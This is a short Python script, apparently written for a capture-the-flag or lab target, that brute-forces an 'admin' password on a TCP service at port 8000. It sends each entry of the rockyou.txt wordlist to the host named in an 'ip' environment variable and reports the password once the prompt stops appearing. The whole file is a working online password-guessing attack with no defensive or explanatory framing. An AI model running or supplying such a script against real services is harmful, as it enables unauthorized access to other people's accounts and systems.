import socket
import os

host = os.environ.get('ip')
if not host:
    print("Error: Environment variable 'ip' is not set")
    exit(1)

port = 8000

wordlist = "/usr/share/wordlists/rockyou.txt"

def fuzz_password(wordlist):
    try:
        with open(wordlist, 'r', errors='ignore') as file:
            for password in file:
                # Clean up lines
                password = password.strip()
                # Establish connection to server
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    # Send "admin" cmd to prompt for password
                    s.sendall(b'admin\n')
                    # Receive the password prompt
                    response = s.recv(1024).decode().strip()
                    if "password" in response.lower():
                        s.sendall((password + '\n').encode())
                        # Receive the response after entering the password
                        response = s.recv(1024).decode().strip()

                        # Check if the password is correct
                        if "password:" not in response.lower():
                            print(f'The password is: {password}')
                            return  # Exit the function if password is found
                    else:
                        print("Unexpected response from server")
                        return

        print("Password not found in wordlist")
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
    except Exception as e:
        print(f"Error has occurred: {e}")

fuzz_password(wordlist)
